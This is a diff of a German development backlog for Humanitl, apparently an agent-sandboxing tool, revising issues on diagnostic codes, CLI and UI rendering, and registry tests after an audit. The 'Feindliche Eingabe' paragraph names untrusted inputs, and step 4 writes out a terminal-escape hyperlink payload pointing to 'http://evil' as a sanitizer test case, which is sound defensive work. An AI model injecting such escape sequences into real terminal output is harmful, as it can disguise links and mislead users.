+- `SANDBOX_004` und `SANDBOX_005` mit neuer Bedeutung („kein seccomp", „`$XDG_RUNTIME_DIR`"): beide sind vergeben („Isolation-Check fehlgeschlagen", „Projektordner nicht beschreibbar", letzterer erzeugt in `bwrap.rs`). Jetzt `SANDBOX_017`/`018`.
+- `PROJECT_001`/`002`: kein Bereich `PROJECT` in `AREAS`, Test `codes_stay_inside_their_area` bricht. Entfallen; „kein Ordner" bekommt einen `CONFIG`-Code, „nicht benutzbar" ist `SANDBOX_005`.
+- `LLM_000`: außerhalb des Bereichs. Jetzt `LLM_008`.
+- LLM- und Projekt-Zeile lasen `config.llm.endpoint` und `config.sandbox.work_dir`: `GetConfig` ist unimplementiert, `DaemonClient` hat keine Konfigurationsmethode. Jetzt `Sandbox(Status)`.
+- Drei Kriterien schrieben in `config.toml` (`ChangeSetting`, Endpoint-Feld, `ui.coach_marks_seen`): kein Schreibweg im Repository, `UiConfig` mit `deny_unknown_fields`. Gestrichen und in Nicht-Ziel benannt.
+- Schritt 1 erfand `SandboxPreflight` als zweiten RPC: `Doctor` steht im Vertrag, der Fake antwortet, HUM-075 hält ihn und erklärt „Blockiert: HUM-044", stand aber hinter HUM-044 in der Reihenfolge. HUM-075 ist jetzt Abhängigkeit und rückt in der Tabelle davor.
+- Weiter korrigiert: `DAEMON_001` mit zwei Fixes (die Leitung trägt einen); Socket-Unit ohne `LISTEN_FDS` (und `free_socket` verweigerte den Start); `ProtectHome=read-only` und `@system-service` ohne `@mount` blockierten die Sandbox; `ExecStart=%h/.local/bin/humanitld` gegen `current_exe()`; `WorkDirPicker` aus `features/sandbox` und Coach-Mark „über der Aktionsleiste" aus `features/setup` verstoßen gegen `check-deps.sh`; `LlmEndpointField` existiert nicht; Header-Badge und `Ctrl+1` sind im Setup unmöglich, solange `ConnectionGate` den Shell-Screen ersetzt; Profil-Dropdown ohne RPC; 2-s-Poll gegen die dokumentierte Entscheidung; `CONFIG_004` ist kein Profil-Befund; `HButton.primary`, `setup_coach_first_hold`, `OpenUrl` als Kopierknopf, `DAEMON_001` heute `Severity.error`; „Ring grün" hängt an HUM-041; „zweiter Tab" ist `Ctrl+4`; kein CLI-Subkommando genannt.
+
+**Offen, hier nicht entschieden:** ob HUM-075 vorher gebaut oder seine Maschinen-Hälfte hierher gezogen wird; ob `OpenUrl` wirklich öffnet (`url_launcher`) oder Kopierknopf bleibt; ob `DAEMON_001` auf `Blocking` wechselt (`client_diagnostics.dart`).
+
+**Seit dem Audit überholt:** HUM-040 ist gemerged; `work_dir_picker.dart` ist getrackt; der Ordnerwunsch reist in `Plan`/`Start` (CONVENTIONS 4.17), was diesem Issue den Schreibweg erspart.
+
+**Aus dem Audit nicht bestätigt:** nichts Wesentliches; Zeilenanker in `client_diagnostics.dart` um eine Zeile verschoben.
+
+**Feindliche Eingabe:** (1) die Modellliste aus dem LAN (siehe Spezifikation; Säuberung in `probe_result_to_proto`, Deckel, `maxLines`, nie `CopyCommand`); (2) das Projekt-Profil aus dem geklonten Repository — die Zeile darf einen `FixAction`, dessen Text auf Projekt-Ebene entstand, nie zu einem Klick machen, vor allem keinen `CopyCommand` und kein `ChangeSetting` für einen dort gesperrten Schlüssel; (3) der getippte Endpoint geht in DNS, bevor jemand entscheidet (`ProbeLlm` löst absichtlich außerhalb der Warteschlange auf) — keine Probe je Tastendruck, `LLM_006`/`LLM_007` sichtbar. Kleiner: `SANDBOX_003` bettet bwraps stderr wörtlich in `why` (`bwrap.rs`); klemmen wie alles andere.
+
 ### Fallstricke
-- `systemctl --user` funktioniert nicht in Umgebungen ohne User-Session-Bus (SSH ohne Linger). `SANDBOX_005`/`DAEMON_001` decken das ab; Fix-Text nennt `loginctl enable-linger`.
+- `systemctl --user` funktioniert nicht in Umgebungen ohne User-Session-Bus (SSH ohne Linger). `SANDBOX_018`/`DAEMON_001` decken das ab; Fix-Text nennt `loginctl enable-linger`.
 - Ubuntu ≥ 23.10 blockiert unprivilegierte User-Namespaces per AppArmor; bwrap aus dem Paket hat ein AppArmor-Profil, das es erlaubt. Preflight prüft erst, ob `bwrap --unshare-user true` funktioniert, bevor es sysctl-Hinweise gibt.
 - Der Daemon darf nie mit `sudo` installiert werden; die Fix-Befehle enthalten kein `sudo` für Humanitl selbst, nur für Paketinstallation.
-- Setup-Screen darf gehaltene Flows nicht verstecken: Wenn die App wegen eines nicht-blockierenden Checks im Setup ist, aber Flows gehalten werden, zeigt der Header-Badge den Zähler und `Ctrl+1` wechselt trotzdem.
+- Setup-Screen darf gehaltene Flows nicht verstecken; deshalb Setup als Zustand in der Shell.
+- `daemon/Cargo.toml` und `proto/humanitl/v1/humanitl.proto` bleiben unberührt; mit `Doctor` braucht dieses Issue keines von beiden.
 
 ### Referenzen
-BACKLOG.md Abschnitt 5 (Usability §1, §6), 4.4 (systemd-Härtung), ADR-010, ADR-012; CONVENTIONS.md 3.4, 3.8. `systemd.exec(5)`, `systemd.socket(5)`, Flathub-Diskussion zu bwrap (https://discourse.flathub.org/t/help-with-running-bubblewrap-in-a-flatpak/3572).
+BACKLOG.md Abschnitt 5 (Usability §1, §6), 4.4 (systemd-Härtung), ADR-010, ADR-012, ADR-018; CONVENTIONS.md 3.4, 3.8, 4.6, 4.11, 4.17; `docs/ARCHITECTURE.md` 3b, 5; HUM-075. `systemd.exec(5)`, Flathub-Diskussion zu bwrap (https://discourse.flathub.org/t/help-with-running-bubblewrap-in-a-flatpak/3572).
 
 ---
 
@@ -1360,7 +1530,9 @@ Erkennung, Zuordnung und Aufzeichnung sind fertig:
   `app/lib/features/history/providers/history_page.dart`). Bis dahin sieht ein
   Mensch den TLS-Fehler nur in `humanitl flows list --json` und im Protokoll
   des Agenten. Der Platz dafür ist
-  `app/lib/features/intercept/widgets/diagnostic_card.dart`.
+  `app/lib/features/intercept/widgets/diagnostic_card.dart`. Das ist
+  **HUM-106** (`BACKLOG.md`, Sprint-2-Tabelle), angelegt am 2026-09-04;
+  HUM-068 hängt für seinen `Flow`-Scope daran.
 - **Der Knopf „Für nächste Session setzen".** Er bräuchte einen
   Schreibweg in die Konfiguration, und den gibt es nicht: der RPC `SetConfig`
   antwortet `unimplemented` und wartet auf den Einstellungen-Bildschirm
@@ -1399,153 +1571,192 @@ BACKLOG.md Abschnitt 4 (TLS), Abschnitt 5 (Usability §6); CONVENTIONS.md 3.2 (D
 ---
 
 ## HUM-068 · Geführte Diagnostics im Sandbox-Screen
-Sprint: 3 · Größe: M · Abhängigkeiten: HUM-040, HUM-041, HUM-044, HUM-045, HUM-063 · Blockiert: HUM-046
+Sprint: 3 · Größe: XL · Abhängigkeiten: HUM-040, HUM-041 (hart: `Check`-Scope und Isolations-Reiter), HUM-043 (`SANDBOX_020..024`), HUM-044 (`SANDBOX_017`, `SANDBOX_018`, `LLM_008`), HUM-045, HUM-063, HUM-106 (`diagnosticsProvider`, `flowId` auf `FlowEvent.diagnostic`, Feed-Karte); für jeden `ChangeSetting`-/`SetEnv`-Fix HUM-069 · Blockiert: HUM-046
 
 ### Kontext
-ADR-012: Jeder nicht-grüne Zustand trägt Grund und Fix. Dieses Issue schließt die Lücken im Sandbox-Bereich, definiert den Katalog aller Codes dieses Sprints an einer Stelle und stellt sicher, dass jede Diagnostic im UI am Ort des Problems erscheint und in der CLI als Block.
+ADR-012: Jeder nicht-grüne Zustand trägt Grund und Fix. Dieses Issue schließt die Lücken im Sandbox-Bereich, hält das Register der Codes an der einen Stelle, die es schon gibt (`daemon/crates/core-types/src/diagnostics/codes.rs`, 80 Codes, 18 Bereiche, erzeugtes `docs/DIAGNOSTICS.md`), und stellt sicher, dass jede Diagnostic im UI am Ort des Problems erscheint und in der CLI als Block.
 
 ### Ziel
-`docs/diagnostics.md` listet alle Codes mit Auslöser, `why`, `fix`. Der Daemon hat einen Registry-Test, der prüft, dass jeder im Code verwendete Code in der Doku steht und `why` nicht leer ist. Der Sandbox-Screen rendert Diagnostics kontextbezogen: Start-Fehler im Header, Mount-Fehler im Mounts-Tab, Isolation-Fehler im Isolation-Tab, TLS-Fehler als Feed-Karte. Die CLI rendert denselben Block überall gleich.
+`docs/DIAGNOSTICS.md` (erzeugt, byte-genau durch `daemon/crates/core-types/tests/diag_docs.rs`) trägt zu jedem Code zusätzlich Auslöser und Fix-Hinweis. Die Registerprüfung „jeder verwendete Code ist registriert" wird vom Compiler getragen. Der Sandbox-Screen rendert Diagnostics kontextbezogen: Start-Fehler im Header, Mount-Fehler im Mounts-Tab, Isolations-Fehler im Isolations-Reiter (nach HUM-041), TLS-Fehler als Feed-Karte (nach HUM-106). Die CLI rendert denselben Block überall gleich, farbig auf einem TTY, und säubert, was sie druckt.
 
 ### Nicht-Ziel
-Keine neuen Prüfungen. Keine Diagnostics für Regeln oder Editor (Sprint 4).
+Keine neuen Prüfungen. Keine Diagnostics für Regeln oder Editor (Sprint 4). Keine zweite Datei `docs/diagnostics.md` neben `docs/DIAGNOSTICS.md` (auf einem Dateisystem ohne Groß/Klein-Unterscheidung dieselbe Datei; alle `docs_anchor` und jede `docs:`-URL zeigen auf die erzeugte). Kein `DiagnosticScope` auf der Leitung in diesem Issue (Vertragsänderung, eigenes Issue). Keine zweisprachige `why` (siehe Stand).
 
 ### Betroffene Pfade
-- `docs/diagnostics.md` (neu)
-- `daemon/crates/core-types/src/diagnostic.rs`: `DiagnosticCode::ALL` (const-Liste), `Diagnostic::for_flow`, `Diagnostic::for_session`, `scope: DiagnosticScope`
-- `daemon/crates/core-types/tests/diagnostic_registry.rs` (neu)
-- `daemon/bin/humanitl/src/render.rs` (neu): CLI-Renderer
-- `app/lib/core/ui/diagnostic_card.dart`: Placement-Varianten (inline row, card, banner)
-- `app/lib/features/sandbox/**`: Einbindung
+- `daemon/crates/core-types/src/diagnostics/codes.rs`: `CodeInfo` bekommt `trigger` und `fix_hint`, gefüllt für alle 80 Codes (geteilte Datei; Struktur-Änderung anmelden); `daemon/crates/core-types/src/diagnostics/mod.rs`: Feld von `DiagnosticCode` privat, `const fn` nur für das Makro `registry!` — es gibt keine `src/diagnostic.rs`, kein `DiagnosticCode::ALL` (die Liste heißt `CODES`), kein `Diagnostic::for_flow`/`for_session`
+- `daemon/crates/core-types/tests/diag_docs.rs`: `render()` druckt die zwei neuen Spalten unter `#### CODE`; `docs/DIAGNOSTICS.md` neu erzeugen mit `UPDATE_DIAG_DOCS=1 cargo test -p humanitl-core --test diag_docs`
+- `daemon/bin/humanitl/src/render.rs` (vorhanden, 371 Zeilen, seit 2026-09-03, mit sechs Tests): Farbe auf `std::io::IsTerminal`, Säuberung in `diagnostic_block`
+- `daemon/bin/humanitl/src/cmd/mod.rs` (`exit_code`), nur wenn Akzeptanzkriterium 3 auf Exit 3 bleibt (siehe Spezifikation)
+- `app/lib/core/ui/h_diagnostic_card.dart` (vorhanden, eine Variante): daneben `HDiagnosticRow` und `HDiagnosticBanner`, alle drei ohne Nutzer-String; `app/lib/core/ui/diagnostic_severity.dart` (neu): die eine Abbildung Severity → Label/Farbe, heute sechsmal dupliziert (`sandbox_screen.dart`, `setup_screen.dart`, `intercept/widgets/action_bar.dart`, `rules/severity.dart`, `tray/widgets/attention_notice.dart`, `history/history_filter_bar.dart`)
+- `app/lib/features/sandbox/**`: Platzierung (`_Diagnostics` für Session-Befunde, `SandboxHeader` liest `status.blocking` schon, `MountsTab`); Isolations-Reiter erst nach HUM-041
+- `app/lib/features/intercept/widgets/diagnostic_card.dart`: Feed-Karte — gehört HUM-106, hier nur eingebunden
+- `daemon/crates/config`: `sandbox.mounts.cache` mit Tier, Beschreibung, Default, `docs/CONFIG.md`, nur wenn `SANDBOX_018`-Cache (siehe Katalog) gebaut wird
 
 ### Spezifikation
 
-`DiagnosticScope`: `Global`, `Session(SessionId)`, `Flow(FlowId)`, `Check(IsolationCheck)`, `Setting(String)`. Die UI wählt den Ort aus dem Scope: `Global` ⇒ Banner oben im aktuellen Screen; `Session` ⇒ Sandbox-Header; `Flow` ⇒ Feed-Karte und Flow-Detail; `Check` ⇒ Isolation-Zeile; `Setting` ⇒ neben dem Feld (Setup/Settings).
+`DiagnosticScope` bleibt eine **Client-Einteilung**, nicht ein Feld auf `Diagnostic`: `Diagnostic` hat sechs Felder (`code`, `severity`, `title`, `why`, `fix`, `docs`), die Proto-Nachricht ebenfalls, `app/lib/core/domain/diagnostic.dart` spiegelt sie. Die Oberfläche leitet den Ort ab: aus `SandboxUpdate.diagnostic` (Session ⇒ Sandbox-Header), aus `SandboxEvent.check` (Check ⇒ Isolations-Zeile, HUM-041), aus `FlowEvent.flow_diagnostic` mit `flow_id` (Flow ⇒ Feed-Karte und Flow-Detail, HUM-106), aus dem Setup (Setting ⇒ neben dem Feld). Wer den Scope wirklich auf die Leitung will, fügt `DiagnosticScope scope = 7;` hinzu, erzeugt beide Seiten neu und erweitert `convert.dart` — eigenes Issue.
 
-Katalog Sprint 3 (vollständige Liste, Details in den jeweiligen Issues):
+Katalog Sprint 3 (**Auszug** als Lesehilfe; verbindlich ist `CODES` in `codes.rs`, und `every_code_has_a_heading_in_the_rendered_docs` hält alle 80 in `docs/DIAGNOSTICS.md`):
 
-| Code | Scope | Severity | Auslöser | fix |
+| Code | Ort (Client) | Severity | Auslöser | fix |
 |---|---|---|---|---|
-| `DAEMON_001` | Global | Blocking | Daemon nicht erreichbar | InstallService, CopyCommand |
-| `DAEMON_002` | Global | Blocking | Proto-Major-Mismatch | OpenUrl |
-| `PROJECT_001` | Setting(sandbox.work_dir) | Blocking | kein Ordner | ChangeSetting |
-| `PROJECT_002` | Setting(sandbox.work_dir) | Blocking | nicht lesbar | CopyCommand |
-| `CONFIG_001` | Setting(profile) | Blocking | Profil unbekannt | CopyCommand |
-| `CONFIG_002` | Setting(profile) | Blocking | TOML-Fehler | OpenUrl(file) |
-| `CONFIG_003` | Session | Blocking | Projekt-Profil mountet Host-Pfade | ChangeSetting |
-| `CONFIG_004` | Session | Warning | Projekt-Profil fremder Besitzer | keine |
-| `SANDBOX_001..005` | Global | Blocking | bwrap fehlt / alt / userns / seccomp / XDG_RUNTIME_DIR | CopyCommand |
-| `SANDBOX_010` | Session | Blocking | kein Shim-Report | CopyCommand("humanitl daemon logs") |
-| `SANDBOX_011..013` | Check(*) | Blocking | Check 1/2/3 fehlgeschlagen | siehe HUM-041 |
-| `SANDBOX_020` | Session | Warning | `unmask` aktiv | ChangeSetting |
-| `SANDBOX_021` | Session | Info | kein openat2 | keine |
-| `SANDBOX_022` | Session | Warning | Symlink nach außen | CopyCommand |
-| `SANDBOX_023` | Session | Warning | Findings in geänderten Dateien | keine |
-| `SANDBOX_024` | Session | Info | Snapshot gekürzt | keine |
-| `SANDBOX_030` | Session | Blocking | Agent-Prozess sofort beendet (Exit < 2 s) | CopyCommand("humanitl sessions logs <id>") |
-| `SANDBOX_031` | Session | Warning | Cache-Volume nicht anlegbar | ChangeSetting(sandbox.mounts.cache=false) |
-| `AGENT_001` | Global | Blocking | opencode fehlt | CopyCommand |
-| `AGENT_002` | Setting(agent.command) | Warning | Override nicht ausführbar | ChangeSetting |
-| `LLM_000` | Setting(llm.endpoint) | Info | nicht konfiguriert | ChangeSetting |
-| `LLM_001..006` | Setting(llm.endpoint) / Flow | siehe HUM-039 | | |
-| `TLS_001..003` | Flow | Warning/Info | siehe HUM-045 | SetEnv, AddRule |
-| `TERM_001` | Session | Error | zweiter Terminal-Client | keine |
+| `DAEMON_001` | Global | Error (Client), Blocking (Daemon) | Daemon nicht erreichbar | `InstallService` (eine Aktion; die Leitung trägt eine) |
+| `DAEMON_002` | Global | Blocking | Proto-Major-Mismatch | `OpenUrl` |
+| `CONFIG_001` | Setting(`sandbox.profile`) | Blocking | Config-Datei ungültig | `CopyCommand` |
+| `CONFIG_002` | Setting(`sandbox.profile`) | Blocking | Unbekannter Schlüssel | `OpenUrl(file)` |
+| `CONFIG_003` | Session | Blocking | Wert außerhalb des Bereichs; Projekt-Profil setzt gesperrten Schlüssel oder mountet Host-Pfade | keine (kein Schreibweg) |
+| `CONFIG_007` | Session | Warning | Projekt-Profil gehört einem anderen Konto | keine |
+| `CONFIG_008`, `CONFIG_009` | Session | Info, Warning | eigenes Profil verdeckt mitgeliefertes; Profilwunsch des Projekts gilt nicht | keine |
+| `CONFIG_004` | Global | Info | Laufzeitverzeichnis ist ein Ersatz | keine |
+| `SANDBOX_001..003` | Global | Blocking | bwrap fehlt / zu alt / userns | `CopyCommand` |
+| `SANDBOX_005`, `SANDBOX_006` | Session | Blocking | Projektordner nicht beschreibbar; Mount verboten | wie `bwrap.rs`/`profile.rs` |
+| `SANDBOX_010..012` | Session | Blocking | Starter-Fehler (Argumentliste, Platzhalter, Kommandozeile) | `CopyCommand("journalctl --user -u humanitld")` — `humanitl daemon logs` gibt es nicht |
+| `SANDBOX_013` | Session | Blocking | kein Shim-Report | wie oben |
+| `SANDBOX_014..016` | Check(1..3) | Blocking | Check 1/2/3 fehlgeschlagen | siehe HUM-041 |
+| `SANDBOX_017`, `SANDBOX_018` | Global | Blocking | kein seccomp im Kernel; `$XDG_RUNTIME_DIR` (HUM-044) | `docs`, `CopyCommand` |
+| `SANDBOX_020..024` | Session | Warning/Info | `unmask`, kein `openat2`, Symlink nach außen, Findings in Dateien, Snapshot gekürzt (HUM-043) | siehe HUM-043 |
+| `AGENT_001..004` | Global / Setting(`agent.command`) | Blocking/Warning | opencode fehlt; Override nicht ausführbar; Vorlage; in der Sandbox nicht erreichbar | `CopyCommand`, `ChangeSetting` (inert bis HUM-069) |
+| `LLM_001..003`, `LLM_006`, `LLM_007` | Setting(`llm.endpoint`) | siehe HUM-039 | | |
+| `LLM_004` | Setting(`llm.endpoint`) | Info | Kein Modell konfiguriert | |
+| `LLM_005` | Flow | Warning | Funde in einer durchgereichten Anfrage | |
+| `LLM_008` | Setting(`llm.endpoint`) | Info | nicht konfiguriert (HUM-044) | |
+| `TLS_001..003` | Flow / Global | Warning/Info | siehe HUM-045 | `SetEnv`, `AddRule` |
+| `TERM_001` | Session | Error | zweiter **schreibender** Terminal-Client | keine |
 
-CLI-Renderer (`render.rs`), Format für jede Diagnostic:
+Die erste Fassung nannte `PROJECT_001/002` (kein Bereich), `CONFIG_001..004` mit fremden Bedeutungen (`CONFIG_004` ist das Laufzeitverzeichnis, die Profilfälle sind `007..009`), `SANDBOX_001..005` als fünf Voraussetzungen (004 ist „Isolation-Check fehlgeschlagen", 005 „Projektordner nicht beschreibbar"), `SANDBOX_010..013` als Check-Codes (CONVENTIONS 4.11 hat das umgestellt), `SANDBOX_030/031` (Bereich endet bei 029) und `LLM_000` (Bereich beginnt bei 001). Die Tabelle oben nimmt die lebenden Nummern. Ein Watchdog „Agent-Prozess sofort beendet" und ein Cache-Volume-Befund bekämen `SANDBOX_017`/`018`, die HUM-044 schon belegt; die nächsten freien sind `SANDBOX_025..029`, und der Cache-Fix braucht vorher den Schlüssel `sandbox.mounts.cache` im Schema (heute: `sandbox.env`, `sandbox.profile`, `sandbox.work_dir`, `sandbox.work_mode`).
+
+CLI-Renderer: `render.rs` ist da und hat ein anderes Format als die erste Fassung, mit zwei Tests, die es festnageln (`the_block_has_the_shape_from_the_issue`, `a_block_without_a_fix_has_three_lines`):
 
 ```
-✖ SANDBOX_012  Unexpected socket inside the sandbox
-  why:  A mount in your profile exposes a host socket: /tmp/.X11-unix/X0
-  fix:  Remove the mount from sandbox.mounts.extra_ro in ~/.config/humanitl/profiles/default.toml
-  docs: https://humanitl.dev/docs/diagnostics#SANDBOX_012
+blocking[SANDBOX_015]: Isolation-Check 2: mehr als eine Tür
+  why: …
+  fix: …
+  docs: <DOCS_BASE>#sandbox_015
 ```
 
-Symbol nach Severity: `ℹ` Info, `⚠` Warning, `✖` Error, `⛔` Blocking. Bei `--json` das Diagnostic-Objekt. Farben nur bei TTY.
+`DOCS_BASE` ist `CARGO_PKG_REPOSITORY` + `/blob/main/docs/DIAGNOSTICS.md`; ein Host `humanitl.dev` kommt im Repository nicht vor. Der Block geht nach stderr, `--json` das Objekt nach stdout. `sandbox check` druckt `✓`/`✗`, und `tests/e2e/m1_sealed_box.sh` greift nach `✓ +$guarantee`; wer die Symbolform `ℹ ⚠ ✖ ⛔` will, schreibt beide Tests und das e2e-Skript im selben Commit um und sagt es im Commit-Text. Neu in diesem Issue: Farbe nur bei `IsTerminal` auf stderr, und `why`, `title` und jeder Fix-Text laufen vor dem Druck durch `humanitl_core::sanitize_note` — `one_line` faltet nur Leerraum und lässt ESC, CSI, OSC 8 und Bidi-Overrides stehen.
 
-UI-Renderer `DiagnosticCard` mit drei Varianten: `inline` (eine Zeile mit Icon, Titel, Fix-Button, aufklappbar für `why`), `card` (Titel, `why`, Fix-Buttons, Docs-Link), `banner` (volle Breite, `bg-2`, Icon, Titel, Fix rechts). Farben: Info `fg-1`, Warning `held`-Amber, Error `error`-Orange, Blocking `blocked`-Rot. Fix-Button-Label je `FixAction`: SetEnv „Für nächste Session setzen", AddRule „Regel anlegen", InstallService „Dienst installieren", ChangeSetting „Einstellung öffnen", CopyCommand „Befehl kopieren", OpenUrl „Mehr erfahren", RemountReadOnly „Nur lesend einbinden".
+UI-Renderer: `HDiagnosticCard` (vorhanden, `card`) plus `HDiagnosticRow` (`inline`: Icon, Titel, Fix-Knopf, aufklappbar für `why`) und `HDiagnosticBanner` (volle Breite, `bg-2`, Icon, Titel, Fix rechts), alle drei ohne Nutzer-String (Vertrag der `H*`-Widgets). Farben: Info → `accent` (heute) oder `fg-1` — wer auf `fg-1` wechselt (UX 3.3: inerter Text ist nie Akzent), ändert alle sechs Stellen über die neue Abbildung; Warning → `state.held`; **Error und Blocking → `state.error`**. Nie `blocked`-Rot: `docs/UX.md` Regel 6 „Rot heißt blockiert. Fehler und Findings sind Orange", und `h_diagnostic_card.dart` sagt es selbst („never the blocked red"). Fix-Labels bleiben die verschifften aus `FixControl` (`setupFixSetEnv` „Set {key}", `setupFixChangeSetting` „Change {key}", `setupFixCopyLink`, `setupFixRemountReadOnly` „Remount read-only", `setupFixAddRule`, `setupFixInstallService`, `setupFixCopyCommand`), in `en` als Quelle; „Für nächste Session setzen" verspräche eine Handlung ohne Schreibweg. Der Docs-Link der Karte wird aus `DOCS_BASE` plus `docs_anchor` des Registers gebaut, nie aus `Diagnostic.docs_url` von der Leitung, sobald er anklickbar ist.
 
-Registry-Test: `grep`-freier Ansatz. `DiagnosticCode::ALL: &[(&str, &str /* doc anchor */)]` wird per Test gegen `docs/diagnostics.md` geprüft (jeder Code hat eine Überschrift `### CODE`), und ein zweiter Test scannt mit `syn` alle `DiagnosticCode("…")`-Literale im Workspace (Build-Skript oder `cargo test` mit `walkdir` über `daemon/`) und prüft Mitgliedschaft in `ALL`.
+Registerprüfung: kein `syn`-Scanner (kein `syn`, `walkdir`, `insta` in `[workspace.dependencies]`; und ein `DiagnosticCode("…")`-Literal kommt außerhalb des Makros `registry!` nirgends vor, der Scan fände nichts). Stattdessen: Feld von `DiagnosticCode` privat (heute `pub &'static str`), Konstruktion nur über `registry!`; „verwendet, aber nicht registriert" ist dann ein Compile-Fehler. Der `debug_assert!` in `Diagnostic::builder` bleibt als Gürtel. `render_cli_format` als einfache String-Zusicherung im Stil von `render.rs`.
 
 ### Schritte
-1. `DiagnosticScope`, `ALL`, Builder-Methoden.
-2. `docs/diagnostics.md` mit allen Codes dieses Sprints (Tabelle oben plus Absätze aus den Issues).
-3. Registry-Tests.
-4. CLI-Renderer, in allen CLI-Fehlerpfaden verwenden.
-5. `DiagnosticCard`-Varianten, Placement im Sandbox-Screen, Snapshot-Tests pro Code (Golden pro Variante, nicht pro Code).
-6. `SANDBOX_030`, `SANDBOX_031` implementieren (Agent-Exit-Watchdog, Cache-Volume-Anlage).
+1. Katalog oben ist bereinigt; die Registerfrage für einen Watchdog/Cache-Befund (`SANDBOX_025+`, `sandbox.mounts.cache`) vorher entscheiden.
+2. `CodeInfo` mit `trigger` und `fix_hint`, alle 80 füllen, `render()` erweitern, `docs/DIAGNOSTICS.md` erzeugen. Kein `docs/diagnostics.md`.
+3. `DiagnosticCode` schließen; `cargo test -p humanitl-core` grün.
+4. `render.rs`: Farbe auf TTY, Säuberung, Test mit `\u{1b}]8;;http://evil\u{7}` in `why` ⇒ inert.
+5. Exit-Code-Frage (Kriterium 3) entscheiden und umsetzen.
+6. Flutter: Severity-Abbildung an einer Stelle, `HDiagnosticRow`/`HDiagnosticBanner`, Goldens je Variante, Platzierung im Sandbox-Screen; Isolations-Reiter nach HUM-041; Feed-Karte nach HUM-106.
+7. Erst dann, nach der Registerfrage: Watchdog („Agent-Prozess innerhalb 2 s beendet") und Cache-Befund.
 
 ### Tests
-- `all_codes_documented`, `all_used_codes_registered`.
-- `render_cli_format` (Snapshot mit `insta`).
-- Widget: `diagnostic_card_inline_expands_why`, `fix_button_label_per_action`, Golden für `card` in vier Severities.
-- `sandbox_030_on_immediate_exit`: Agent-Kommando `false` ⇒ Diagnostic innerhalb 3 s.
+- `every_code_has_a_heading_in_the_rendered_docs` (vorhanden), `docs_in_sync` (vorhanden), neu `every_code_has_trigger_and_fix_hint`.
+- `render_cli_format` (String-Zusicherung), `render_sanitizes_control_sequences`, `colour_only_on_tty`.
+- Widget: `diagnostic_row_expands_why`, `fix_button_label_per_action` (gegen die ARB), Golden für `card`, `row`, `banner` in vier Severities.
+- `sandbox_watchdog_on_immediate_exit`: Agent-Kommando `false` ⇒ Diagnostic innerhalb 3 s (mit der dann vergebenen Nummer).
 
 ### Akzeptanzkriterien
-- [ ] `docs/diagnostics.md` enthält jeden Code aus der Tabelle mit Auslöser, why, fix.
-- [ ] `cargo test -p humanitl-core diagnostic_registry` grün; ein neuer, undokumentierter Code lässt den Test rot werden.
-- [ ] `humanitl sandbox check` auf einem System ohne bwrap zeigt den Block im Format oben, Exit 3.
-- [ ] Im Sandbox-Screen erscheinen Diagnostics am jeweils definierten Ort, nie als Modal.
+- [ ] `docs/DIAGNOSTICS.md` (erzeugt) enthält jeden Code aus `CODES` mit Auslöser, `why`-Muster und Fix-Hinweis; `docs_in_sync` grün.
+- [ ] Ein Code, der nicht in `registry!` steht, lässt den Bau scheitern (privates Feld), nicht erst einen Test.
+- [ ] `humanitl sandbox check` auf einem System ohne bwrap zeigt den Block im verschifften Format — heute mit **Exit 1** (`SANDBOX_001` fällt in `exit_code` auf `EXIT_USER`; nur `SANDBOX_004` und `013..016` sind Exit 3, und CONVENTIONS 3.8 reserviert 3 für „Sandbox-Check fehlgeschlagen"). Wer Exit 3 will, nimmt `SANDBOX_001..003` in den `EXIT_CHECK`-Arm und ändert CONVENTIONS 3.8 und `EXIT_CODES_HELP` in `cli.rs` (Test `the_help_documents_the_exit_codes_and_every_config_key`) im selben Commit. Eine der beiden Lesarten, nicht beide.
+- [ ] Im Sandbox-Screen erscheinen Diagnostics am jeweils definierten Ort, nie als Modal; Blocking bleibt `state.error`.
+- [ ] Ein `why` mit OSC 8 druckt in der CLI inert.
+
+### Stand (2026-09-04): Größe XL, der Katalog widersprach dem Register in 12 von 22 Zeilen, der Renderer ist längst da, beide Nicht-Global-Scopes haben weder Erzeuger noch Verbraucher
+
+Audit von 28 Agenten gegen den Code: 21 Widersprüche, 12 blockierend, oben im Text korrigiert. Vorhanden: das Register mit `AREAS` (18 Bereiche), `registry!`, 80 Codes, `lookup`, fünf Wächtertests (`codes_are_unique`, `codes_follow_schema`, `anchors_match_the_code`, `codes_stay_inside_their_area`, `lookup_finds_registered_codes`); `DiagnosticBuilder` mit Typzustand, der ein `why` erzwingt; `diag_docs.rs` mit Generator und zwei Tests; `docs/DIAGNOSTICS.md`; `render.rs` mit `Renderer`, `diagnostic_block`, `diagnostic_json`, `docs_url`, `fix_line` für alle sieben `FixAction`, `table`, `tick`; `exit_code` in `cmd/mod.rs`; `check`/`report`/`check_failure` in `cmd/sandbox.rs`; die ganze Daemon-Hälfte der TLS-Karte (`tls_observe.rs`); `HDiagnosticCard`, `FixControl` mit sieben lokalisierten Labels; der Sandbox-Screen mit `_Diagnostics`-Block und `SandboxHeader.status.blocking`; `sanitize_note`. Daher XL statt M: nicht weil viel fehlt, sondern weil fast alles Genannte anders heißt, anders aussieht oder woanders wohnt, und weil die zwei Scopes Vorarbeit in drei anderen Issues brauchen.
+
+**Blockierend in der ersten Fassung, jetzt korrigiert:**
+
+- `PROJECT_001/002`: kein Bereich `PROJECT`, `codes_stay_inside_their_area` bricht. Entfallen (HUM-044 nimmt `CONFIG`/`SANDBOX_005`).
+- `CONFIG_001..004` mit vier fremden Bedeutungen: lebend sind „Config-Datei ungültig", „Unbekannter Schlüssel", „Wert außerhalb des Bereichs", „Laufzeitverzeichnis ist ein Ersatz"; die Profilfälle sind `CONFIG_007..009`.
+- `SANDBOX_001..005` als bwrap/alt/userns/seccomp/XDG: 004 und 005 heißen anders; seccomp und XDG sind `017`/`018` aus HUM-044.
+- `SANDBOX_010` kein Report, `011..013` Checks: CONVENTIONS 4.11 legt `010..012` als Starter-Fehler und `013..016` als Check-Codes fest; `cmd/mod.rs` bestätigt es. HUM-041 trug dieselben alten Nummern und ist heute ebenfalls korrigiert.
+- `SANDBOX_030/031` außerhalb des Bereichs (bis 029), `LLM_000` außerhalb (ab 001); `cargo test -p humanitl-core` würde rot.
+- `render.rs` „(neu)" mit Symbolformat: existiert seit 2026-09-03 mit dem Format `severity[CODE]: title` und zwei Tests; das e2e-Skript M1 greift nach `✓`.
+- Kriterium „Exit 3 ohne bwrap": heute Exit 1; beide Lesarten standen nebeneinander.
+- `docs/diagnostics.md` (neu) neben dem erzeugten `docs/DIAGNOSTICS.md` mit `#### CODE`-Überschriften: Kollision und sofortige Drift.
